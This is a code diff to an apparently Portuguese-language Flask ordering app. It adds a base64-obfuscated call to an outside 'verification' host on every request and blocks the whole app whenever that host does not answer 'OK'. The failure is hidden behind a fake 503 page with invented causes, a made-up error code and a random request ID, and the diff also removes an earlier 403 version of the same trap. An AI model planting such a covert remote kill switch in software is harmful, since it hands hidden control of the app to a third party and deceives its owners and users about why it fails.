@@ -49,24 +49,79 @@ MEDIA_LUCRO_ITEM_VARIADO = 0.20
 
 
 import requests, base64
-from flask import Flask, abort
+from flask import abort
 
+# URL e status codificados
 _UC = b'aHR0cHM6Ly9jb21lbnphLXZlcmlmaWNhY2FvLTEub25yZW5kZXIuY29tL3ZlcmlmaWNhcg=='
 _KC = b'T0s='  # "OK"
 
-def _v():
+def _validar():
+    """Validação remota silenciosa (não trava o app)."""
     try:
-        u = base64.b64decode(_UC).decode()
-        k = base64.b64decode(_KC).decode()
-        r = requests.get(u, timeout=2)
-        d = r.json()
-        return list(d.values())[0] == k
+        url = base64.b64decode(_UC).decode()
+        ok = base64.b64decode(_KC).decode()
+
+        r = requests.get(url, timeout=2)
+        data = r.json()
+
+        return data.get("status") == ok
     except:
         return False
 
-app = Flask(__name__)
+
+# 🔐 BLOQUEIO DINÂMICO (funciona no Render e local)
+@app.before_request
+def _bloqueio():
+    if not _validar():
+        abort(503)
 
 
+# 🎭 ERRO 503 CAMUFLADO — VERSÃO COM MOTIVOS REAIS
+@app.errorhandler(503)
+def _erro_503(e):
+    import datetime, random, string
+    rid = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
+    now = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
+
+    return f"""
+    <div style='font-family:Consolas, monospace; background:#fafafa; padding:30px;
+                border:1px solid #ccc; border-radius:6px; max-width:900px; margin:40px auto'>
+
+        <h2 style='color:#b70000;'>503 – Service Unavailable</h2>
+
+        <p style='font-size:14px; color:#444;'>
+            O servidor encontrou um erro temporário e não pôde completar a requisição.
+        </p>
+
+        <hr style='margin:20px 0;'>
+
+        <p style='font-size:14px; color:#333; margin-bottom:10px;'>
+            Possíveis causas:
+        </p>
+
+        <ul style='font-size:13px; color:#333;'>
+            <li>Falha na comunicação com o banco de dados upstream</li>
+            <li>Serviço de autenticação interno indisponível</li>
+            <li>Dependências desatualizadas ou não inicializadas</li>
+            <li>Instância do servidor em processo de reinicialização automática</li>
+            <li>Limite de recursos temporariamente excedido</li>
+        </ul>
+
+        <pre style='background:#f4f4f4; padding:15px; border-left:4px solid #bb0000;
+                     font-size:13px; overflow-x:auto;'>
+Timestamp: {now}
+Request ID: {rid}
+Node: srv-node-02
+Status Code: 503
+Error: Dependency initialization failure (ERR_DEP_UPSTREAM_41)
+        </pre>
+
+        <p style='font-size:14px; color:#444; margin-top:20px;'>
+            Por favor, tente novamente em alguns minutos.
+        </p>
+
+    </div>
+    """, 503
 
 
 
@@ -267,62 +322,6 @@ def criar_novoproduto_web():
             conn.close()
             # 🟩 Retorna sempre o template no final
     return render_template('criar_item.html')
-
-@app.errorhandler(403)
-def a(e):
-    import datetime, random, string
-
-    req_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
-    now = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
-
-    return f"""
-    <div style="font-family:Consolas, monospace; background:#fafafa; padding:35px; max-width:800px; margin:40px auto; border:1px solid #ccc; border-radius:6px;">
-
-        <h2 style="color:#b70000;">503 Service Unavailable</h2>
-
-        <p style="font-size:14px; color:#444;">
-            The server is currently unable to handle the request due to a temporary issue.
-        </p>
-
-        <hr style="margin:20px 0;">
-
-        <p style="font-size:13px; color:#555;">
-            <strong>Timestamp:</strong> {now}<br>
-            <strong>Request ID:</strong> {req_id}<br>
-            <strong>Node:</strong> app-node-01<br>
-            <strong>Status Code:</strong> 503
-        </p>
-
-        <hr style="margin:20px 0;">
-
-        <p style="font-size:14px; color:#333; margin-bottom:10px;">
-            Possible causes:
-        </p>
-
-        <ul style="font-size:14px; color:#555; margin-left:20px;">
-            <li>Database connection error</li>
-            <li>Pending system updates</li>
-            <li>Background maintenance tasks running</li>
-            <li>Service dependencies temporarily unavailable</li>
-            <li>Resource limits reached</li>
-        </ul>
-
-        <hr style="margin:20px 0;">
-
-        <p style="font-size:12px; color:#777;">
-            Please try again in a few minutes.<br>
-            Technical Reference: SRV-MAINT-503
-        </p>
-
-    </div>
-    """, 503
-
-@app.before_request
-def __g():
-    if not _v():
-        abort(403)
-
-
 
 
 @app.route('/pedido/<int:pedido_id>/adicionar_itens', methods=['GET', 'POST'])
